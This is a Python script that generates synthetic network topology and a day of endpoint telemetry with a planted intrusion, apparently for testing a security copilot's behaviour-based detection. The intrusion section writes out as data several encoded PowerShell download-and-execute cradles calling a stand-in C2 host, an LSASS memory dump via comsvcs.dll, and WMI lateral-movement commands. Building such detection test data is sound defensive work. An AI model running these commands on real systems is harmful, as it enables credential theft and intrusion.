"""Synthetic enterprise: network topology + a day of endpoint telemetry with one hidden intrusion.

Story: a finance user opens a macro document, an encoded PowerShell cradle runs, LSASS is
dumped, and the actor moves laterally over WMI. Only the first host fires an alert; the
lateral-movement footholds use *different* encoded payloads, so signature matching misses
them. The copilot finds them by behaviour similarity in Qdrant.
"""
from __future__ import annotations

import base64
import random
from dataclasses import dataclass, asdict

SEED = 916
PATIENT_ZERO = "WS-FIN-07"
COMPROMISED = ["WS-FIN-03", "FS-01", "WS-HR-02"]
C2_DOMAIN = "cdn-update.cloud"
C2_IP = "45.137.21.9"

SEGMENTS = {
    "DMZ": ["WEB-01", "WEB-02", "VPN-GW"],
    "SERVERS": ["DC-01", "DC-02", "FS-01", "SQL-01", "EXCH-01", "SCCM-01", "BACKUP-01"],
    "FINANCE": [f"WS-FIN-0{i}" for i in range(1, 8)],
    "HR": [f"WS-HR-0{i}" for i in range(1, 5)],
    "ENGINEERING": [f"WS-ENG-0{i}" for i in range(1, 7)],
}
USERS = {
    "WS-FIN-01": "a.schulz", "WS-FIN-02": "m.weber", "WS-FIN-03": "l.fischer", "WS-FIN-04": "k.wagner",
    "WS-FIN-05": "s.becker", "WS-FIN-06": "t.hoffmann", "WS-FIN-07": "j.meyer",
    "WS-HR-01": "n.koch", "WS-HR-02": "e.richter", "WS-HR-03": "p.klein", "WS-HR-04": "c.wolf",
    "WS-ENG-01": "d.neumann", "WS-ENG-02": "f.schwarz", "WS-ENG-03": "r.zimmer", "WS-ENG-04": "b.krause",
    "WS-ENG-05": "h.lange", "WS-ENG-06": "o.braun",
}
ROLE = {"DMZ": "edge", "SERVERS": "server", "FINANCE": "workstation", "HR": "workstation",
        "ENGINEERING": "workstation"}


def topology() -> dict:
    nodes = [
        {"id": "INTERNET", "label": "Internet", "kind": "cloud", "segment": "EXTERNAL"},
        {"id": "FW-EDGE", "label": "FW-EDGE", "kind": "firewall", "segment": "CORE"},
        {"id": "CORE-SW", "label": "CORE-SW", "kind": "switch", "segment": "CORE"},
    ]
    links = [{"source": "INTERNET", "target": "FW-EDGE"}, {"source": "FW-EDGE", "target": "CORE-SW"}]
    for seg, hosts in SEGMENTS.items():
        sw = f"SW-{seg[:3]}"
        nodes.append({"id": sw, "label": sw, "kind": "switch", "segment": seg})
        links.append({"source": "FW-EDGE" if seg == "DMZ" else "CORE-SW", "target": sw})
        for h in hosts:
            role = "dc" if h.startswith("DC-") else ROLE[seg]
            nodes.append({"id": h, "label": h, "kind": role, "segment": seg, "user": USERS.get(h)})
            links.append({"source": sw, "target": h})
    return {"nodes": nodes, "links": links}


def all_hosts() -> list[str]:
    return [h for hosts in SEGMENTS.values() for h in hosts]


def b64ps(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


@dataclass
class Event:
    id: int
    t: int                 # seconds since midnight (demo day)
    host: str
    user: str
    parent: str
    process: str
    cmdline: str
    decoded: str | None    # enrichment: decoded -EncodedCommand payload
    event_type: str        # process_creation | process_access | network
    allowlisted: bool      # known-good baseline (e.g. Intune / SCCM)
    alert: str | None      # rule that fired, if any
    severity: str | None
    truth: str             # benign | malicious  (never shown to the copilot)

    def behaviour_text(self) -> str:
        """What we embed: behaviour with obfuscation removed, not raw bytes."""
        body = self.decoded if self.decoded else self.cmdline
        extra = " [encoded command]" if self.decoded else ""
        return f"{self.parent} spawned {self.process}{extra}: {body}"

    def to_payload(self) -> dict:
        d = asdict(self)
        d["behaviour"] = self.behaviour_text()
        return d


def _hms(h: int, m: int, s: int = 0) -> int:
    return h * 3600 + m * 60 + s


def generate_events() -> list[Event]:
    rng = random.Random(SEED)
    events: list[Event] = []

    def add(t, host, parent, process, cmdline, *, decoded=None, etype="process_creation",
            allowlisted=False, alert=None, severity=None, truth="benign", user=None):
        events.append(Event(0, t, host, user or USERS.get(host, "SYSTEM"), parent, process, cmdline,
                            decoded, etype, allowlisted, alert, severity, truth))

    hosts = all_hosts()
    workstations = [h for h in hosts if h.startswith("WS-")]

    # ---------- benign background noise ----------
    office = [
        ("explorer.exe", "OUTLOOK.EXE", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'),
        ("explorer.exe", "EXCEL.EXE", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /dde'),
        ("OUTLOOK.EXE", "WINWORD.EXE", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\{u}\\Documents\\Report_{n}.docx"'),
        ("explorer.exe", "chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --profile-directory=Default'),
        ("explorer.exe", "ms-teams.exe", '"C:\\Program Files\\WindowsApps\\MSTeams\\ms-teams.exe" --system-initiated'),
        ("svchost.exe", "taskhostw.exe", "taskhostw.exe Install $(Arg0)"),
        ("services.exe", "svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"),
        ("explorer.exe", "notepad.exe", '"C:\\Windows\\system32\\notepad.exe" C:\\Users\\{u}\\Desktop\\todo.txt'),
    ]
    eng = [
        ("Code.exe", "git.exe", "git.exe fetch --prune origin"),
        ("WindowsTerminal.exe", "python.exe", "python.exe -m pytest tests/ -q"),
        ("WindowsTerminal.exe", "node.exe", "node.exe node_modules/.bin/vite build"),
        ("WindowsTerminal.exe", "powershell.exe", "powershell.exe -NoLogo"),
        ("powershell.exe", "docker.exe", "docker.exe compose up -d postgres"),
        ("powershell.exe", "ssh.exe", "ssh.exe deploy@build-runner-02"),
    ]
    admin_ps = [  # legit PowerShell that *looks* suspicious to naive similarity
        ("CcmExec.exe", "powershell.exe",
         "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -File \\\\SCCM-01\\scripts\\HardwareInventory.ps1"),
        ("svchost.exe", "powershell.exe",
         'powershell.exe -NoProfile -NonInteractive -Command "Update-MpSignature -UpdateSource MicrosoftUpdateServer"'),
        ("MonitoringHost.exe", "powershell.exe",
         'powershell.exe -NoProfile -Command "Get-CimInstance Win32_LogicalDisk | Export-Csv C:\\Monitoring\\disk.csv"'),
    ]
    intune_scripts = [  # encoded + hidden, yet benign: the classic false positive
        "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | ConvertTo-Json",
        "$s = Get-BitLockerVolume -MountPoint C:; if ($s.ProtectionStatus -ne 'On') { exit 1 }",
        "Get-WindowsUpdateLog -LogPath $env:ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\wu.log",
        "Invoke-WebRequest -Uri https://intune.microsoft.com/compliance/check -UseBasicParsing | Out-Null",
    ]

    for _ in range(900):
        h = rng.choice(workstations)
        t = rng.randint(_hms(7, 30), _hms(11, 30))
        if h.startswith("WS-ENG") and rng.random() < 0.5:
            p, proc, cmd = rng.choice(eng)
        else:
            p, proc, cmd = rng.choice(office)
        add(t, h, p, proc, cmd.format(u=USERS[h], n=rng.randint(10, 99)))

    for h in hosts:
        for _ in range(rng.randint(2, 4)):
            p, proc, cmd = rng.choice(admin_ps)
            add(rng.randint(_hms(7, 0), _hms(11, 30)), h, p, proc, cmd, user="SYSTEM", allowlisted=True)
        if h.startswith("WS-"):
            for _ in range(rng.randint(1, 3)):
                script = rng.choice(intune_scripts)
                add(rng.randint(_hms(7, 0), _hms(11, 30)), h, "AgentExecutor.exe", "powershell.exe",
                    f"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {b64ps(script)}",
                    decoded=script, user="SYSTEM", allowlisted=True)

    server_noise = {
        "DC-01": [("services.exe", "lsass.exe", "C:\\Windows\\system32\\lsass.exe"),
                  ("svchost.exe", "dfsrs.exe", "C:\\Windows\\system32\\DFSRs.exe")],
        "DC-02": [("services.exe", "lsass.exe", "C:\\Windows\\system32\\lsass.exe")],
        "SQL-01": [("services.exe", "sqlservr.exe", '"C:\\Program Files\\Microsoft SQL Server\\MSSQL16\\Binn\\sqlservr.exe" -sMSSQLSERVER'),
                   ("SQLAGENT.EXE", "sqlcmd.exe", "sqlcmd.exe -S localhost -Q \"BACKUP DATABASE Finance TO DISK='E:\\bak\\fin.bak'\"")],
        "EXCH-01": [("w3wp.exe", "csc.exe", "csc.exe /noconfig /fullpaths @\"C:\\Windows\\TEMP\\x2k.cmdline\"")],
        "BACKUP-01": [("VeeamSvc.exe", "VeeamAgent.exe", "VeeamAgent.exe -job Nightly-Files -mode incremental")],
        "FS-01": [("services.exe", "svchost.exe", "svchost.exe -k LocalSystemNetworkRestricted -s LanmanServer")],
        "WEB-01": [("w3wp.exe", "php-cgi.exe", "php-cgi.exe -b 127.0.0.1:9000")],
        "WEB-02": [("nginx.exe", "nginx.exe", "nginx.exe -g daemon off")],
        "VPN-GW": [("services.exe", "openvpnserv.exe", "openvpnserv.exe -config server.ovpn")],
        "SCCM-01": [("CcmExec.exe", "SMSExec.exe", "SMSExec.exe -policy refresh")],
    }
    for h, entries in server_noise.items():
        for _ in range(25):
            p, proc, cmd = rng.choice(entries)
            add(rng.randint(_hms(6, 0), _hms(11, 30)), h, p, proc, cmd, user="SYSTEM")

    # ---------- everyday alert noise ----------
    add(_hms(7, 55, 12), "EXCH-01", "w3wp.exe", "csc.exe",
        'csc.exe /noconfig /fullpaths @"C:\\Windows\\TEMP\\owa_view.cmdline"', user="SYSTEM",
        alert="Compiler Spawned by IIS Worker Process", severity="medium")
    add(_hms(8, 12, 40), "WEB-01", "nginx.exe", "nginx.exe", "GET /wp-login.php UA=sqlmap/1.8", etype="network",
        user="-", alert="Web Scanner User-Agent Detected", severity="low")
    add(_hms(8, 47, 3), "VPN-GW", "openvpnserv.exe", "openvpnserv.exe", "auth failed x14 user=k.wagner src=91.64.12.8",
        etype="auth", user="k.wagner", alert="Multiple Failed VPN Logons", severity="medium")
    add(_hms(9, 2, 55), "WS-ENG-03", "explorer.exe", "python-3.13.1-amd64.exe",
        '"C:\\Users\\r.zimmer\\Downloads\\python-3.13.1-amd64.exe" /passive', alert="Executable Run from Downloads",
        severity="low")
    add(_hms(9, 31, 20), "WS-HR-04", "svchost.exe", "OneDrive.exe", "OneDrive.exe /background sync 2,140 files",
        etype="network", user="c.wolf", alert="Unusual Upload Volume to Cloud Storage", severity="low")

    # ---------- the intrusion ----------
    stage1 = f"IEX (New-Object Net.WebClient).DownloadString('http://{C2_DOMAIN}/a.ps1')"
    add(_hms(9, 12, 4), PATIENT_ZERO, "OUTLOOK.EXE", "WINWORD.EXE",
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\j.meyer\\Downloads\\Invoice_Q3_2026.docm"',
        truth="malicious")
    add(_hms(9, 12, 31), PATIENT_ZERO, "WINWORD.EXE", "powershell.exe",
        f"powershell.exe -nop -w hidden -enc {b64ps(stage1)}", decoded=stage1,
        alert="Suspicious Encoded PowerShell Spawned by Office Application", severity="critical",
        truth="malicious")
    add(_hms(9, 12, 33), PATIENT_ZERO, "powershell.exe", "powershell.exe",
        f"TCP connect {C2_IP}:443 ({C2_DOMAIN})", etype="network", truth="malicious")
    add(_hms(9, 15, 10), PATIENT_ZERO, "powershell.exe", "rundll32.exe",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\m.dmp full",
        alert="Process Memory Dump Via Comsvcs.DLL", severity="high", truth="malicious")
    add(_hms(9, 18, 2), PATIENT_ZERO, "powershell.exe", "net.exe",
        'net.exe group "Domain Admins" /domain', truth="malicious")

    variants = {
        "WS-FIN-03": ("-NoP -NonI -W Hidden -EncodedCommand",
                      f'$c=New-Object System.Net.WebClient;$c.Headers.Add("User-Agent","Mozilla/5.0");IEX $c.DownloadString("https://{C2_DOMAIN}/s2.ps1")'),
        "FS-01": ("-enc",
                  f"Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://{C2_IP}/p'))"),
        "WS-HR-02": ("-w 1 -ep bypass -e",
                     f"iex(iwr -UseBasicParsing http://{C2_IP}/stage2.ps1)"),
    }
    t = _hms(9, 21, 0)
    for victim, (flags, script) in variants.items():
        add(t, PATIENT_ZERO, "powershell.exe", "wmic.exe",
            f'wmic.exe /node:{victim} process call create "powershell.exe {flags} ..."', truth="malicious")
        add(t + 3, victim, "WmiPrvSE.exe", "powershell.exe", f"powershell.exe {flags} {b64ps(script)}",
            decoded=script, user="j.meyer", truth="malicious")
        t += rng.randint(240, 600)
    add(_hms(9, 41, 12), "WS-HR-02", "powershell.exe", "rundll32.exe",
        "rundll32 comsvcs.dll #24 812 C:\\ProgramData\\hr.bin full", user="j.meyer", truth="malicious")

    events.sort(key=lambda e: e.t)
    for i, e in enumerate(events, start=1):
        e.id = i
    return events
